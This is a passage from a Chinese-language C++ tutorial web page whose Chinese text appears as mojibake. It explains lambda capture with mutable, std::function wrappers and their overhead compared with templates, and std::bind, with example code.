mutable_lambda(); <span class="comment">// è¾“å‡º 2</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Original counter: &quot;</span> &lt;&lt; counter &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 0 (åŸå§‹ counter æœªå˜)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ¼”ç¤ºå¼•ç”¨æ•è·ä¿®æ”¹å¤–éƒ¨å˜é‡</span></span><br><span class="line">    <span class="keyword">int</span> external_sum = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">std</span>::for_each(nums.begin(), nums.end(),</span><br><span class="line">                  [&amp;external_sum](<span class="keyword">int</span> x)&#123; <span class="comment">// å¼•ç”¨æ•è·</span></span><br><span class="line">                      external_sum += x;</span><br><span class="line">                  &#125;);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sum calculated via lambda: &quot;</span> &lt;&lt; external_sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 55</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong><code>mutable</code> å…³é”®å­—:</strong> é»˜è®¤æƒ…å†µä¸‹ï¼Œé€šè¿‡<strong>å€¼æ•è·</strong>çš„å˜é‡åœ¨ Lambda å‡½æ•°ä½“å†…éƒ¨æ˜¯ <code>const</code> çš„ï¼Œä¸èƒ½è¢«ä¿®æ”¹ã€‚å¦‚æœä½ éœ€è¦åœ¨ Lambda å†…éƒ¨ä¿®æ”¹å€¼æ•è·å˜é‡çš„<strong>å‰¯æœ¬</strong>ï¼ˆè¿™ç§ä¿®æ”¹ä¸ä¼šå½±å“å¤–éƒ¨åŸå§‹å˜é‡ï¼‰ï¼Œå¯ä»¥åœ¨å‚æ•°åˆ—è¡¨ <code>()</code> ä¹‹åï¼ˆæˆ–æ•è·åˆ—è¡¨ <code>[]</code> ä¹‹åï¼Œå¦‚æœæ²¡æœ‰å‚æ•°ï¼‰åŠ ä¸Š <code>mutable</code> å…³é”®å­—ã€‚</p><p>Lambda è¡¨è¾¾å¼æ˜¯ç°ä»£ C++ ä¸­ç¼–å†™ç®€æ´ã€é«˜æ•ˆä¸”æ˜“è¯»ä»£ç çš„é‡è¦å·¥å…·ï¼Œå°¤å…¶æ˜¯åœ¨ä¸ STL ç®—æ³•ç»“åˆä½¿ç”¨æ—¶ã€‚</p><h2 id="18-5-åŒ…è£…å™¨"><a href="#18-5-åŒ…è£…å™¨" class="headerlink" title="18.5 åŒ…è£…å™¨"></a>18.5 åŒ…è£…å™¨</h2><p>åœ¨ C++ ä¸­ï¼Œæœ‰å¤šç§â€œå¯è°ƒç”¨ (Callable)â€çš„å®ä½“ï¼šæ™®é€šå‡½æ•°ã€å‡½æ•°æŒ‡é’ˆã€å‡½æ•°å¯¹è±¡ï¼ˆFunctorsï¼‰ã€Lambda è¡¨è¾¾å¼ã€ç±»çš„æˆå‘˜å‡½æ•°æŒ‡é’ˆç­‰ã€‚è™½ç„¶å®ƒä»¬éƒ½å¯ä»¥è¢«è°ƒç”¨ï¼Œä½†å®ƒä»¬çš„<strong>ç±»å‹</strong>å„ä¸ç›¸åŒã€‚è¿™åœ¨éœ€è¦å­˜å‚¨æˆ–ä¼ é€’æœªçŸ¥ç±»å‹çš„å¯è°ƒç”¨å®ä½“æ—¶ä¼šå¸¦æ¥ä¸ä¾¿ã€‚</p><p>ä¾‹å¦‚ï¼Œä½ å¯èƒ½æƒ³åˆ›å»ºä¸€ä¸ªå›è°ƒå‡½æ•°åˆ—è¡¨ï¼Œåˆ—è¡¨ä¸­çš„å‡½æ•°å¯ä»¥æ¥è‡ªä¸åŒçš„æºï¼ˆæœ‰äº›æ˜¯æ™®é€šå‡½æ•°ï¼Œæœ‰äº›æ˜¯ Lambdaï¼Œæœ‰äº›æ˜¯å¯¹è±¡çš„æˆå‘˜å‡½æ•°ï¼‰ï¼Œä½†å®ƒä»¬éƒ½æ¥å—ç›¸åŒçš„å‚æ•°å¹¶è¿”å›ç›¸åŒçš„ç±»å‹ã€‚å¦‚ä½•ç”¨ä¸€ä¸ªç»Ÿä¸€çš„ç±»å‹æ¥å­˜å‚¨å®ƒä»¬å‘¢ï¼Ÿ</p><p>C++11 åœ¨ <code>&lt;functional&gt;</code> å¤´æ–‡ä»¶ä¸­æä¾›äº† <code>std::function</code> æ¨¡æ¿ç±»ï¼Œå®ƒæ˜¯ä¸€ä¸ªé€šç”¨çš„ã€å¤šæ€çš„<strong>å‡½æ•°åŒ…è£…å™¨ (Function Wrapper)**ã€‚<code>std::function</code> çš„å¯¹è±¡å¯ä»¥</strong>å­˜å‚¨ã€å¤åˆ¶å’Œè°ƒç”¨**ä»»ä½•ç¬¦åˆå…¶æŒ‡å®šå‡½æ•°ç­¾åçš„å¯è°ƒç”¨å®ä½“ã€‚</p><h3 id="18-5-1-åŒ…è£…å™¨-function"><a href="#18-5-1-åŒ…è£…å™¨-function" class="headerlink" title="18.5.1 åŒ…è£…å™¨ function"></a>18.5.1 åŒ…è£…å™¨ <code>function</code></h3><p><code>std::function</code> çš„æ¨¡æ¿å‚æ•°æ˜¯å®ƒæ‰€è¦åŒ…è£…çš„å‡½æ•°çš„**ç­¾å (Signature)**ã€‚</p><p><strong>è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;functional&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::function&lt;ReturnType(ArgType1, ArgType2, ...)&gt; func_wrapper;</span><br></pre></td></tr></table></figure><ul><li>  <code>ReturnType</code>: è¢«åŒ…è£…å‡½æ•°çš„è¿”å›ç±»å‹ã€‚</li><li>  <code>ArgType1, ArgType2, ...</code>: è¢«åŒ…è£…å‡½æ•°æ¥å—çš„å‚æ•°ç±»å‹åˆ—è¡¨ã€‚</li></ul><p><strong>åŸºæœ¬ç”¨æ³•:</strong></p><p>ä½ å¯ä»¥å°†ä»»ä½•å…·æœ‰å…¼å®¹ç­¾åçš„å¯è°ƒç”¨å®ä½“èµ‹å€¼ç»™ <code>std::function</code> å¯¹è±¡ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;functional&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. æ™®é€šå‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_message</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; msg)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Function Pointer: &quot;</span> &lt;&lt; msg &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. å‡½æ•°å¯¹è±¡ (Functor)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Printer</span> &#123;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> prefix;</span><br><span class="line">    Printer(<span class="built_in">std</span>::<span class="built_in">string</span> p) : prefix(p) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; msg)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Functor (&quot;</span> &lt;&lt; prefix &lt;&lt; <span class="string">&quot;): &quot;</span> &lt;&lt; msg &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. ç±»çš„æˆå‘˜å‡½æ•°</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Greeter</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">greet</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; name)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Member Function: Hello, &quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot;!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å®šä¹‰ä¸€ä¸ªå¯ä»¥åŒ…è£… void(const std::string&amp;) ç±»å‹å‡½æ•°çš„ std::function</span></span><br><span class="line">    <span class="built_in">std</span>::function&lt;<span class="keyword">void</span>(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp;)&gt; callback;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// a) åŒ…è£…æ™®é€šå‡½æ•°æŒ‡é’ˆ</span></span><br><span class="line">    callback = print_message;</span><br><span class="line">    callback(<span class="string">&quot;Hello from function pointer!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// b) åŒ…è£… Lambda è¡¨è¾¾å¼</span></span><br><span class="line">    callback = [](<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; msg) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Lambda: &quot;</span> &lt;&lt; msg &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    callback(<span class="string">&quot;Hello from lambda!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// c) åŒ…è£…å‡½æ•°å¯¹è±¡</span></span><br><span class="line">    <span class="function">Printer <span class="title">my_printer</span><span class="params">(<span class="string">&quot;LOG&quot;</span>)</span></span>;</span><br><span class="line">    callback = my_printer; <span class="comment">// Functor å¯¹è±¡å¯ä»¥ç›´æ¥èµ‹å€¼</span></span><br><span class="line">    callback(<span class="string">&quot;Hello from functor!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// d) åŒ…è£…ç±»çš„æˆå‘˜å‡½æ•° (éœ€è¦ç»‘å®šå¯¹è±¡)</span></span><br><span class="line">    Greeter greeter_obj;</span><br><span class="line">    <span class="comment">// ä½¿ç”¨ std::bind (æˆ–è€… Lambda) æ¥ç»‘å®š this æŒ‡é’ˆ</span></span><br><span class="line">    callback = <span class="built_in">std</span>::bind(&amp;Greeter::greet, &amp;greeter_obj, <span class="built_in">std</span>::placeholders::_1);</span><br><span class="line">    <span class="comment">// æˆ–è€…ä½¿ç”¨ Lambda æ•è·å¯¹è±¡</span></span><br><span class="line">    <span class="comment">// callback = [&amp;greeter_obj](const std::string&amp; name)&#123; greeter_obj.greet(name); &#125;;</span></span><br><span class="line">    callback(<span class="string">&quot;Alice&quot;</span>); <span class="comment">// è°ƒç”¨ greeter_obj.greet(&quot;Alice&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ£€æŸ¥ std::function æ˜¯å¦ä¸ºç©º (æ˜¯å¦æŒæœ‰å¯è°ƒç”¨å¯¹è±¡)</span></span><br><span class="line">    <span class="keyword">if</span> (callback) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Callback is holding a callable entity.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ¸…ç©º std::function</span></span><br><span class="line">    callback = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">if</span> (!callback) &#123;</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Callback is now empty.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å­˜å‚¨ä¸åŒç±»å‹çš„å›è°ƒå‡½æ•°</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::function&lt;<span class="keyword">void</span>(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp;)&gt;&gt; callbacks;</span><br><span class="line">    callbacks.push_back(print_message);</span><br><span class="line">    callbacks.push_back([](<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; s)&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Another Lambda: &quot;</span> &lt;&lt; s &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; &#125;);</span><br><span class="line">    callbacks.push_back(my_printer);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\n--- Calling stored callbacks ---&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; cb : callbacks) &#123;</span><br><span class="line">        cb(<span class="string">&quot;Test message&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>std::function</code> é€šè¿‡<strong>ç±»å‹æ“¦é™¤ (Type Erasure)</strong> æŠ€æœ¯å®ç°äº†è¿™ç§é€šç”¨æ€§ã€‚å®ƒå†…éƒ¨å¯ä»¥å­˜å‚¨ä¸åŒç±»å‹çš„å¯è°ƒç”¨å¯¹è±¡ï¼Œå¹¶åœ¨è°ƒç”¨æ—¶é€šè¿‡æŸç§æœºåˆ¶ï¼ˆé€šå¸¸æ¶‰åŠå †åˆ†é…å’Œè™šå‡½æ•°è°ƒç”¨ï¼Œç‰¹åˆ«æ˜¯å¯¹äºæ•è·äº†æ•°æ®çš„ Lambda æˆ–å¤§å‹å‡½æ•°å¯¹è±¡ï¼‰æ¥æ‰§è¡Œå®é™…çš„è°ƒç”¨ã€‚</p><h3 id="18-5-1-ç»­-function-åŠæ¨¡æ¿çš„ä½æ•ˆæ€§-æ½œåœ¨å¼€é”€"><a href="#18-5-1-ç»­-function-åŠæ¨¡æ¿çš„ä½æ•ˆæ€§-æ½œåœ¨å¼€é”€" class="headerlink" title="18.5.1 (ç»­) function åŠæ¨¡æ¿çš„ä½æ•ˆæ€§ (æ½œåœ¨å¼€é”€)"></a>18.5.1 (ç»­) <code>function</code> åŠæ¨¡æ¿çš„ä½æ•ˆæ€§ (æ½œåœ¨å¼€é”€)</h3><p>è™½ç„¶ <code>std::function</code> éå¸¸çµæ´»ï¼Œä½†è¿™ç§çµæ´»æ€§æ˜¯æœ‰ä»£ä»·çš„ï¼š</p><ol><li><p><strong>ç±»å‹æ“¦é™¤å¼€é”€:</strong> ä¸ºäº†èƒ½å¤Ÿå­˜å‚¨ä»»æ„ç±»å‹çš„å¯è°ƒç”¨å¯¹è±¡ï¼Œ<code>std::function</code> é€šå¸¸éœ€è¦åœ¨å†…éƒ¨å¤„ç†ç±»å‹ä¿¡æ¯ã€‚è¿™å¯èƒ½æ¶‰åŠåˆ°ï¼š</p><ul><li>  <strong>å †åˆ†é…:</strong> å¦‚æœè¢«åŒ…è£…çš„å¯è°ƒç”¨å¯¹è±¡ï¼ˆç‰¹åˆ«æ˜¯å¸¦æ•è·çš„ Lambda æˆ–å‡½æ•°å¯¹è±¡ï¼‰æ¯”è¾ƒå¤§ï¼Œæˆ–è€…ä¸èƒ½é€šè¿‡â€œå°å¯¹è±¡ä¼˜åŒ– (Small Object Optimization, SOO)â€ç›´æ¥å­˜å‚¨åœ¨ <code>std::function</code> å¯¹è±¡å†…éƒ¨ï¼Œå°±å¯èƒ½éœ€è¦åœ¨å †ä¸Šåˆ†é…å†…å­˜æ¥å­˜å‚¨å®ƒã€‚å †åˆ†é…å’Œé‡Šæ”¾æ˜¯æœ‰å¼€é”€çš„ã€‚</li><li>  <strong>é—´æ¥è°ƒç”¨:</strong> è°ƒç”¨å­˜å‚¨åœ¨ <code>std::function</code> ä¸­çš„å‡½æ•°é€šå¸¸éœ€è¦é€šè¿‡æŒ‡é’ˆæˆ–è™šå‡½æ•°è¿›è¡Œé—´æ¥è°ƒç”¨ï¼Œè¿™æ¯”ç›´æ¥å‡½æ•°è°ƒç”¨æˆ–æ¨¡æ¿å®ä¾‹åŒ–äº§ç”Ÿçš„å†…è”è°ƒç”¨è¦æ…¢ã€‚</li></ul></li><li><p><strong>ç›¸æ¯”æ¨¡æ¿çš„ä½æ•ˆæ€§:</strong> å¦‚æœåœ¨ç¼–è¯‘æ—¶å°±çŸ¥é“å…·ä½“çš„å¯è°ƒç”¨ç±»å‹ï¼Œä½¿ç”¨<strong>æ¨¡æ¿</strong>é€šå¸¸ä¼šæ›´é«˜æ•ˆã€‚æ¨¡æ¿å…è®¸ç¼–è¯‘å™¨ä¸ºæ¯ç§å…·ä½“çš„ç±»å‹ç”Ÿæˆä¸“é—¨çš„ä»£ç ï¼Œå¹¶ä¸”æ›´å®¹æ˜“è¿›è¡Œå†…è”ä¼˜åŒ–ï¼Œé¿å…äº† <code>std::function</code> çš„ç±»å‹æ“¦é™¤å’Œé—´æ¥è°ƒç”¨å¼€é”€ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä½¿ç”¨æ¨¡æ¿ï¼Œæ›´é«˜æ•ˆ</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Callable&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process_with_template</span><span class="params">(Callable func, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; data)</span> </span>&#123;</span><br><span class="line">    func(data); <span class="comment">// ç›´æ¥è°ƒç”¨ï¼Œå¯èƒ½å†…è”</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨ std::functionï¼Œæ›´çµæ´»ï¼Œä½†å¯èƒ½æœ‰å¼€é”€</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process_with_function</span><span class="params">(<span class="built_in">std</span>::function&lt;<span class="keyword">void</span>(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp;)&gt; func, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; data)</span> </span>&#123;</span><br><span class="line">    func(data); <span class="comment">// é—´æ¥è°ƒç”¨</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> my_lambda = [](<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; s)&#123; <span class="comment">/*...*/</span> &#125;;</span><br><span class="line">    process_with_template(my_lambda, <span class="string">&quot;data&quot;</span>); <span class="comment">// é«˜æ•ˆ</span></span><br><span class="line">    process_with_function(my_lambda, <span class="string">&quot;data&quot;</span>); <span class="comment">// çµæ´»ï¼Œä½†å¯èƒ½ç¨æ…¢</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p><strong>ä½•æ—¶ä½¿ç”¨ <code>std::function</code>ï¼Ÿ</strong></p><ul><li>  å½“ä½ éœ€è¦åœ¨<strong>è¿è¡Œæ—¶</strong>ç¡®å®šè¦è°ƒç”¨å“ªä¸ªå‡½æ•°ï¼Œæˆ–è€…éœ€è¦å­˜å‚¨<strong>ä¸åŒç±»å‹</strong>çš„å¯è°ƒç”¨å¯¹è±¡åœ¨åŒä¸€ä¸ªå®¹å™¨ä¸­æ—¶ï¼ˆå¦‚å›è°ƒç³»ç»Ÿã€äº‹ä»¶å¤„ç†ï¼‰ã€‚</li><li>  å½“ä½ éœ€è¦å®šä¹‰ä¸€ä¸ªæ¥å—<strong>ä»»ä½•</strong>ç¬¦åˆç‰¹å®šç­¾åçš„å¯è°ƒç”¨å¯¹è±¡çš„æ¥å£æ—¶ã€‚</li></ul><p><strong>ä½•æ—¶é¿å…ä½¿ç”¨ <code>std::function</code> (å¦‚æœæ€§èƒ½æ˜¯å…³é”®)ï¼Ÿ</strong></p><ul><li>  å½“ä½ åœ¨ç¼–è¯‘æ—¶å°±çŸ¥é“å…·ä½“çš„å¯è°ƒç”¨ç±»å‹æ—¶ï¼Œä¼˜å…ˆä½¿ç”¨æ¨¡æ¿æˆ–ç›´æ¥è°ƒç”¨ã€‚</li><li>  åœ¨æ€§èƒ½æå…¶æ•æ„Ÿçš„ä»£ç è·¯å¾„ä¸­ï¼ˆå¦‚ç´§å¯†å¾ªç¯å†…éƒ¨ï¼‰ï¼Œéœ€è¦ä»”ç»†è¯„ä¼° <code>std::function</code> å¸¦æ¥çš„å¼€é”€ã€‚</li></ul><h3 id="18-5-2-ä¿®å¤é—®é¢˜-18-5-3-å…¶ä»–æ–¹å¼"><a href="#18-5-2-ä¿®å¤é—®é¢˜-18-5-3-å…¶ä»–æ–¹å¼" class="headerlink" title="18.5.2 ä¿®å¤é—®é¢˜ / 18.5.3 å…¶ä»–æ–¹å¼"></a>18.5.2 ä¿®å¤é—®é¢˜ / 18.5.3 å…¶ä»–æ–¹å¼</h3><p>è¿™é‡Œçš„â€œä¿®å¤é—®é¢˜â€ä¸»è¦æ˜¯æŒ‡ç†è§£ <code>std::function</code> çš„å¼€é”€å¹¶æ ¹æ®åœºæ™¯é€‰æ‹©åˆé€‚çš„æŠ€æœ¯ã€‚â€œå…¶ä»–æ–¹å¼â€åˆ™åŒ…æ‹¬ï¼š</p><ol><li><p> <strong>ä½¿ç”¨æ¨¡æ¿:</strong> å¦‚ä¸Šæ‰€è¿°ï¼Œå½“ç±»å‹åœ¨ç¼–è¯‘æ—¶å·²çŸ¥æ—¶ï¼Œæ¨¡æ¿æ˜¯æœ€é«˜æ•ˆçš„é€‰æ‹©ã€‚</p></li><li><p> <strong>ä½¿ç”¨å‡½æ•°æŒ‡é’ˆ:</strong> å¯¹äºç®€å•çš„ã€æ— çŠ¶æ€çš„å‡½æ•°ï¼Œç›´æ¥ä½¿ç”¨å‡½æ•°æŒ‡é’ˆç±»å‹ <code>ReturnType(*)(ArgTypes...)</code> ä»ç„¶æ˜¯æœ‰æ•ˆçš„ï¼Œå¹¶ä¸”å¼€é”€å¾ˆå°ã€‚</p></li><li><p> <strong>ä½¿ç”¨ Lambda:</strong> Lambda æœ¬èº«æ˜¯é«˜æ•ˆçš„ï¼ˆå®ƒä»¬æ˜¯åŒ¿åçš„å‡½æ•°å¯¹è±¡ï¼‰ã€‚åªæœ‰å½“å®ƒä»¬è¢«å­˜å‚¨åœ¨ <code>std::function</code> ä¸­æ—¶ï¼Œæ‰å¯èƒ½å¼•å…¥ <code>std::function</code> çš„å¼€é”€ã€‚å¦‚æœå¯ä»¥å°† Lambda ç›´æ¥ä¼ é€’ç»™æ¨¡æ¿åŒ–çš„å‡½æ•°ï¼ˆå¦‚ STL ç®—æ³•ï¼‰ï¼Œé€šå¸¸ä¸ä¼šæœ‰é¢å¤–å¼€é”€ã€‚</p></li><li><p><strong><code>std::bind</code>:</strong> (åœ¨ <code>&lt;functional&gt;</code> ä¸­) <code>std::bind</code> å¯ä»¥ç”¨æ¥ç»‘å®šå‡½æ•°çš„å‚æ•°ï¼ˆåŒ…æ‹¬æˆå‘˜å‡½æ•°çš„ <code>this</code> æŒ‡é’ˆï¼‰æˆ–é‡æ–°æ’åˆ—å‚æ•°é¡ºåºï¼Œç”Ÿæˆä¸€ä¸ªæ–°çš„å¯è°ƒç”¨å¯¹è±¡ (å‡½æ•°å¯¹è±¡)ã€‚è™½ç„¶ <code>std::bind</code> ä¹Ÿèƒ½è¢« <code>std::function</code> å­˜å‚¨ï¼Œä½†ç°ä»£ C++ ä¸­ï¼ŒLambda é€šå¸¸æä¾›äº†æ›´ç®€æ´ã€æ›´æ˜“è¯»çš„æ–¹å¼æ¥å®Œæˆç±»ä¼¼çš„ä»»åŠ¡ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;functional&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a=&quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot;, b=&quot;</span> &lt;&lt; b &lt;&lt; <span class="string">&quot;, c=&quot;</span> &lt;&lt; c &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ç»‘å®šç¬¬ä¸€ä¸ªå‚æ•°ä¸º 100ï¼Œç¬¬äºŒä¸ªå‚æ•°ç”±è°ƒç”¨è€…æä¾› (_1)ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ä¸º 300</span></span><br><span class="line">    <span class="keyword">auto</span> bound_func = <span class="built_in">std</span>::bind(func, <span class="number">100</span>, <span class="built_in">std</span>::placeholders::_1, <span class="number">300</span>);</span><br><span class="line">    bound_func(<span class="number">200</span>); <span class="comment">// è°ƒç”¨ func(100, 200, 300)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ Lambda å®ç°ç›¸åŒæ•ˆæœ</span></span><br><span class="line">    <span class="keyword">auto</span> lambda_func = [](<span class="keyword">int</span> b)&#123; func(<span class="number">100</span>, b, <span class="number">300</span>); &#125;;</span><br><span class="line">    lambda_func(<span class="number">200</span>); 